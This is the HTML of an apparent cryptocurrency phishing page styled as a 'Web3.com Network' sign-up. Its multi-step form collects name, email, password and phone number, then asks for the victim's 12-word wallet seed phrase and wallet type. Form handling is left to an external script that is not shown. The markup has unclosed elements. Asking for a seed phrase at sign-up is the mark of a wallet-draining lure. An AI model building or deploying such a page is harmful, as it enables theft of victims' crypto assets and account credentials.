<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Web3.com Network | Sign Up</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="auth-container">

  <h1>Web3.com</h1>
  <h3>(NETWORK)</h3>

  <p class="tagline">
    CONNECT YOUR CRYPTO ASSETS TO A SAFE NETWORK.<br><br>
  </p>

  <form id="multiStepForm">

    <!-- STEP 1 -->
 <div class="step active">
    <h2>Enter your full name</h2>
    <input type="text" id="name" required>
    <button type="button" onclick="nextStep()">Next</button>
  </div>

    <!-- STEP 2 -->
    <div class="step">
       <h2>Email address</h2>
      <input type="email" placeholder="Email Address" required>
  <button onclick="prevStep()">Back</button>
  <button onclick="nextStep()">Next</button>
</div>

    <!-- STEP 3 -->
     <div class="step">
        <h2>Create password</h2>
       <input type="password" id="password" required>
  <button type="button" onclick="prevStep()">Back</button>
  <button type="button" onclick="nextStep()">Next</button>
</div>

    <!-- STEP 4 -->
    <div class="step">
       <h2>Phone Number</h2>
      <input type="tel" placeholder="Phone Number" required>
  <button onclick="prevStep()">Back</button>
  <button onclick="nextStep()">Next</button>
</div>

    <!-- STEP 5 -->
    <div class="step">
      <h2>Phrase keys (12 words)</h2>
      <div class="grid-words">
        <input><input><input><input>
        <input><input><input><input>
        <input><input><input><input>
      </div>
      <div class="btn-row">
  <button onclick="prevStep()">Back</button>
  <button onclick="nextStep()">Next</button>
</div>

    <!-- STEP 6 -->
  <div class="step">
  <h2>Select Wallet Type</h2>

  <select id="walletType" required>
    <option value="">Choose wallet</option>
    <option>Ethereum</option>
    <option>Solana</option>
    <option>Bitcoin</option>
    <option>Polygon</option>
    <option>Avalanche</option>
    <option>BNB Chain</option>
    <option>Tron</option>
  </select>

   <div class="buttons">
    <button type="button" class="back-btn">Back</button>
    <button type="submit">Create Account</button>
  </div>
</div>

  <p class="switch">
    Already have an account? <a href="login.html">Login</a>
  </p>

</div>
<!-- Loading Screen -->
<div id="loadingScreen" class="loading-screen">
  <p>Please hold on, your account is being created...</p>
</div>
<script src="script.js"></script>
</body>
</html>
